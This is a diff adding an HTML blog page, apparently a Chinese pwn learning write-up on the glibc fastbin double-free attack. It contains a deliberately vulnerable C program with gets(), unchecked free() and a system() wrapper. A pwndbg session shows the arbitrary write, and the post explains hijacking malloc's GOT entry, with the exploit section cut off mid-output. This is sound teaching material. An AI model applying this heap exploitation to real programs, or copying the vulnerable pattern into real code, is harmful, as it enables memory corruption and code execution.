@@ -1,0 +1,478 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  <title>Fastbin_Double_Free | sir</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="似水流年月下花前 一舞倾城醉红颜岁暮天寒月缺花残 独留孤影忆从前">
+<meta name="keywords" content="pwn-堆">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Fastbin_Double_Free">
+<meta property="og:url" content="https://cc-sir.github.io/2019/01/19/Fastbin_Double_Free/index.html">
+<meta property="og:site_name" content="sir">
+<meta property="og:description" content="似水流年月下花前 一舞倾城醉红颜岁暮天寒月缺花残 独留孤影忆从前">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2019-01-19T09:22:43.528Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Fastbin_Double_Free">
+<meta name="twitter:description" content="似水流年月下花前 一舞倾城醉红颜岁暮天寒月缺花残 独留孤影忆从前">
+  
+    <link rel="alternative" href="/atom.xml" title="sir" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.png">
+  
+  
+      <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
+  
+      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+  <!-- 加载特效 -->
+    <script src="/js/pace.js"></script>
+    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet">
+  <script>
+      var yiliaConfig = {
+          rootUrl: '/',
+          fancybox: true,
+          animate: true,
+          isHome: false,
+          isPost: true,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false
+      }
+  </script>
+</head></html>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            
+            <img lazy-src="/img/touxiang.png" class="js-avatar">
+            
+        </a>
+
+        <hgroup>
+          <h1 class="header-author"><a href="/" title="Hi Mate">钞sir</a></h1>
+        </hgroup>
+
+        
+        
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">博客首页</a></li>
+                        
+                            <li><a href="/archives">所有文章</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fl mail" target="_blank" href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=1787684615@qq.com" title="mail">mail</a>
+                            
+                                <a class="fl github" target="_blank" href="https://github.com/cc-sir" title="github">github</a>
+                            
+                                <a class="fl QQ" target="_blank" href="tencent://QQInterLive/?Cmd=2&Uin=1787684615" title="QQ">QQ</a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <a href="/tags/pwn-堆/" style="font-size: 10px;">pwn-堆</a>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://ThunderJie.github.io/">ThunderJie</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://optimic.github.io/">观樂。</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">自古良君多生悲</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="Me">钞sir</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                
+                    <img lazy-src="/img/touxiang.png" class="js-avatar">
+                
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="Me">钞sir</a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">博客首页</a></li>
+                
+                    <li><a href="/archives">所有文章</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                <div class="social">
+                    
+                        <a class="mail" target="_blank" href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=1787684615@qq.com" title="mail">mail</a>
+                    
+                        <a class="github" target="_blank" href="https://github.com/cc-sir" title="github">github</a>
+                    
+                        <a class="QQ" target="_blank" href="tencent://QQInterLive/?Cmd=2&Uin=1787684615" title="QQ">QQ</a>
+                    
+                </div>
+            </nav>
+        </header>                
+    </div>
+</nav>
+      <div class="body-wrap"><article id="post-Fastbin_Double_Free" class="article article-type-post" itemscope="" itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2019/01/19/Fastbin_Double_Free/" class="article-date">
+      <time datetime="2019-01-19T09:22:43.563Z" itemprop="datePublished">2019-01-19</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Fastbin_Double_Free
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn-堆/">pwn-堆</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>似水流年月下花前 一舞倾城醉红颜<br>岁暮天寒月缺花残 独留孤影忆从前</p>
+<a id="more"></a>
+<hr>
+<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>fastbin attack 是一类漏洞的利用方法，是指所有基于 fastbin 机制的漏洞利用方法，而fastbin_double_free就是其中的一种,这类漏洞利用的前提是：<br>存在堆溢出、use-after-free等能控制chunk内容的漏洞<br>漏洞发生于fastbin类型的chunk中<br>Fastbin Double Free就是其字面所表达的意思，当一个内存被释放之后再次被释放，就是Free()了同一块内存多次，其精髓在于多次分配可以从 fastbin 链表中取出同一个堆块，相当于多个指针指向同一个堆块，结合堆块的数据内容可以实现类似于类型混淆 (type confused) 的效果</p>
+<hr>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>Fastbin Double Free 能够成功利用主要有两部分的原因：<br>fastbin 的堆块被释放后 next_chunk 的 pre_inuse 位不会被清空<br>fastbin 在执行 free 的时候仅验证了 main_arena 直接指向的块，即链表指针头部的块。对于链表后面的块，并没有进行验证<br>通俗的讲就是当我们申请的一块chunk被释放后，它将以单链的形式被串在fastbin中，然后会有一个fast指针指向最后一个链上来了的chunk，当下一个chunk被释放后，将被链在上一个chunk的前面，fast指针向前移动</p>
+<hr>
+<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>heap.c<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sh</span><span class="params">(<span class="keyword">char</span> *id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	system(id);	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">int</span> cmd,idx,sz;</span><br><span class="line">	<span class="keyword">char</span> *ptr[<span class="number">10</span>];</span><br><span class="line">	<span class="built_in">memset</span>(ptr,<span class="number">0</span>,<span class="keyword">sizeof</span>(ptr));</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"1.malloc+gets\n2.free\n3.puts\n"</span>);</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"&gt; "</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">"%d %d"</span>,&amp;cmd,&amp;idx); <span class="comment">//这里cmd是选择功能，idx是为了区分申请的第几个chunk</span></span><br><span class="line">		idx %= <span class="number">10</span>;</span><br><span class="line">		<span class="keyword">if</span>(cmd==<span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">"%d%*c"</span>,&amp;sz);</span><br><span class="line">			ptr[idx] = <span class="built_in">malloc</span>(sz);</span><br><span class="line">			gets(ptr[idx]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(cmd==<span class="number">2</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">free</span>(ptr[idx]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(cmd==<span class="number">3</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">puts</span>(ptr[idx]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"> 	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>编译：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -no-pie heap.c -o heap -g -w</span><br></pre></td></tr></table></figure></p>
+<p>分析：<br>这个程序主要有3个功能，malloc+gets申请一块chunk并且向chunk中写入一段内容，free释放一块chunk，puts打印出一个chunk，很明显这个程序中有double_free漏洞<br>先运行程序看看：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@sir-PC:/home/sir/desktop<span class="comment"># ./heap</span></span><br><span class="line">1.malloc+gets</span><br><span class="line">2.free</span><br><span class="line">3.puts</span><br><span class="line"></span><br><span class="line">&gt; 1 0</span><br><span class="line">25 aaaabbbb</span><br><span class="line">&gt; 3 0</span><br><span class="line">aaaabbbb</span><br><span class="line">&gt; 2 0</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></p>
+<p>double_free的基本思路：<br>为了使操作更简单每次我们的操作的chunk的大小都应该相同</p>
+<h2 id="首先先申请两块chunk：ptr-0-和ptr-1-，随便写入8字节的内容，然后分别free-ptr-0-free-ptr-1-free-ptr-0-，此时在ptr-0-和ptr-1-之间形成了一个双向链表，然后我们再申请一个chunk：ptr-2-，写入我们需要修改的地址，然后在申请两个chunk：ptr-3-和ptr-4-，随便写入8字节的内容，最后再次申请一个chunk：ptr-5-此时写入我们需要修改成的内容，就可以实现任意地址内容修改了"><a href="#首先先申请两块chunk：ptr-0-和ptr-1-，随便写入8字节的内容，然后分别free-ptr-0-free-ptr-1-free-ptr-0-，此时在ptr-0-和ptr-1-之间形成了一个双向链表，然后我们再申请一个chunk：ptr-2-，写入我们需要修改的地址，然后在申请两个chunk：ptr-3-和ptr-4-，随便写入8字节的内容，最后再次申请一个chunk：ptr-5-此时写入我们需要修改成的内容，就可以实现任意地址内容修改了" class="headerlink" title="首先先申请两块chunk：ptr[0]和ptr[1]，随便写入8字节的内容，然后分别free(ptr[0]),free(ptr[1]),free(ptr[0])，此时在ptr[0]和ptr[1]之间形成了一个双向链表，然后我们再申请一个chunk：ptr[2]，写入我们需要修改的地址，然后在申请两个chunk：ptr[3]和ptr[4]，随便写入8字节的内容，最后再次申请一个chunk：ptr[5],此时写入我们需要修改成的内容，就可以实现任意地址内容修改了"></a>首先先申请两块chunk：ptr[0]和ptr[1]，随便写入8字节的内容，然后分别free(ptr[0]),free(ptr[1]),free(ptr[0])，此时在ptr[0]和ptr[1]之间形成了一个双向链表，然后我们再申请一个chunk：ptr[2]，写入我们需要修改的地址，然后在申请两个chunk：ptr[3]和ptr[4]，随便写入8字节的内容，最后再次申请一个chunk：ptr[5],此时写入我们需要修改成的内容，就可以实现任意地址内容修改了</h2><h2 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h2><p>现在我们来演示一下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">root@sir-PC:/home/sir/desktop<span class="comment"># gdb heap</span></span><br><span class="line">GNU gdb (Debian 7.12-6+b2) 7.12.0.20161007-git</span><br><span class="line">pwndbg: loaded 174 commands. Type pwndbg [filter] <span class="keyword">for</span> a list.</span><br><span class="line">pwndbg: created <span class="variable">$rebase</span>, <span class="variable">$ida</span> gdb <span class="built_in">functions</span> (can be used with <span class="built_in">print</span>/<span class="built_in">break</span>)</span><br><span class="line">Reading symbols from heap...done.</span><br><span class="line">pwndbg&gt; b 20</span><br><span class="line">Breakpoint 1 at 0x40083b: file heap.c, line 20.</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: /home/sir/desktop/heap </span><br><span class="line">1.malloc+gets</span><br><span class="line">2.free</span><br><span class="line">3.puts</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Breakpoint 1, main () at heap.c:20</span><br><span class="line">20			<span class="built_in">printf</span>(<span class="string">"&gt; "</span>);</span><br><span class="line">pwndbg&gt; n</span><br><span class="line">1 0</span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">25 aaaabbbb   <span class="comment">#申请第一次ptr[0]</span></span><br><span class="line">pwndbg&gt; p ptr[0]</span><br><span class="line"><span class="variable">$1</span> = 0x602670 <span class="string">"aaaabbbb"</span></span><br><span class="line">pwndbg&gt; x/20gx 0x602670-16</span><br><span class="line">0x602660:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x602670:	0x6262626261616161	0x0000000000000000</span><br><span class="line">0x602680:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602690:	0x0000000000000000	0x0000000000020971</span><br><span class="line">0x6026a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">&gt; 1 1</span><br><span class="line">25 qqqqssss   <span class="comment">#申请第二次ptr[1]</span></span><br><span class="line">pwndbg&gt; x/20gx 0x602670-16</span><br><span class="line">0x602660:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x602670:	0x6262626261616161	0x0000000000000000</span><br><span class="line">0x602680:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602690:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x6026a0:	0x7373737371717171	0x0000000000000000</span><br><span class="line">0x6026b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026c0:	0x0000000000000000	0x0000000000020941</span><br><span class="line">0x6026d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">&gt; 2 0  <span class="comment">#释放ptr[0]</span></span><br><span class="line">pwndbg&gt; x/20gx 0x602670-16</span><br><span class="line">0x602660:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x602670:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602680:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602690:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x6026a0:	0x7373737371717171	0x0000000000000000</span><br><span class="line">0x6026b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026c0:	0x0000000000000000	0x0000000000020941</span><br><span class="line">0x6026d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">&gt; 2 1  <span class="comment">#释放ptr[1]</span></span><br><span class="line">pwndbg&gt; x/20gx 0x602670-16</span><br><span class="line">0x602660:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x602670:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602680:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602690:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x6026a0:	0x0000000000602670	0x0000000000000000 //bp指向0x602670 ptr[0]</span><br><span class="line">0x6026b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026c0:	0x0000000000000000	0x0000000000020941</span><br><span class="line">0x6026d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">&gt; 2 0	<span class="comment">#再次释放ptr[0]</span></span><br><span class="line">pwndbg&gt; x/20gx 0x602670-16</span><br><span class="line">0x602660:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x602670:	0x00000000006026a0	0x0000000000000000 //bp指向0x6026a0 ptr[1]</span><br><span class="line">0x602680:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602690:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x6026a0:	0x0000000000602670	0x0000000000000000</span><br><span class="line">0x6026b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026c0:	0x0000000000000000	0x0000000000020941</span><br><span class="line">0x6026d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026f0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure></p>
+<p>此时我们double_free的工作就做完了，现在我们来修改一个任意地址的内容，为了方便输入我们就修改0x602660这个地址的内容，我们看到了0x602660原来的值为0，我们将其修改为AAAAAAAA，即0x4141414141414141<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">&gt; 1 2</span><br><span class="line">25 `&amp;`		<span class="comment">#申请第三次ptr[2],写入0x602660</span></span><br><span class="line">pwndbg&gt; x/20gx 0x602670-16</span><br><span class="line">0x602660:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x602670:	0x0000000000602660	0x0000000000000000	//ptr[2],即原来的ptr[0]</span><br><span class="line">0x602680:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602690:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x6026a0:	0x0000000000602670	0x0000000000000000</span><br><span class="line">0x6026b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026c0:	0x0000000000000000	0x0000000000020941</span><br><span class="line">0x6026d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">&gt; 1 3</span><br><span class="line">25 aaaabbbb	<span class="comment">#申请第四次ptr[3]</span></span><br><span class="line">pwndbg&gt; x/20gx 0x602670-16</span><br><span class="line">0x602660:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x602670:	0x0000000000602660	0x0000000000000000</span><br><span class="line">0x602680:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602690:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x6026a0:	0x6262626261616161	0x0000000000000000	//ptr[3],即原来的ptr[1]</span><br><span class="line">0x6026b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026c0:	0x0000000000000000	0x0000000000020941</span><br><span class="line">0x6026d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">&gt; 1 4</span><br><span class="line">25 qqqqssss	<span class="comment">#申请第五次ptr[4]</span></span><br><span class="line">pwndbg&gt; x/20gx 0x602670-16</span><br><span class="line">0x602660:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x602670:	0x7373737371717171	0x0000000000000000 //ptr[4],将ptr[2]覆盖了</span><br><span class="line">0x602680:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602690:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x6026a0:	0x6262626261616161	0x0000000000000000</span><br><span class="line">0x6026b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026c0:	0x0000000000000000	0x0000000000020941</span><br><span class="line">0x6026d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026f0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure></p>
+<p>如果我们再次申请一块chunk，我们就在0x602660的位置写入我们想要的东西了，因为此时fast指针已经指向了0x602660的位置了<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">&gt; 1 5</span><br><span class="line">25 AAAAAAAA	第六次申请ptr[5]</span><br><span class="line">pwndbg&gt; x/20gx 0x602670-16</span><br><span class="line">0x602660:	0x4141414141414141	0x0000000000000000 //已经被修改了</span><br><span class="line">0x602670:	0x7373737371717171	0x0000000000000000</span><br><span class="line">0x602680:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602690:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x6026a0:	0x6262626261616161	0x0000000000000000</span><br><span class="line">0x6026b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026c0:	0x0000000000000000	0x0000000000020941</span><br><span class="line">0x6026d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026f0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure></p>
+<p>很明显0x602660位置的内容已经被我们修改了，如果我们把0x602660换成一个特殊的地址，比如malloc函数got表的地址，然后将其换成sh()函数的地址，那么当我们再次调用malloc函数的时候就会去调用sh()函数了</p>
+<hr>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">sir@sir-PC:~/desktop$ objdump -R heap</span><br><span class="line"></span><br><span class="line">heap：     文件格式 elf64-x86-64</span><br><span class="line"></span><br><span class="line">DYNAMIC RELOCATION RECORDS</span><br><span class="line">OFFSET           TYPE              VALUE </span><br><span class="line">0000000000600ff0 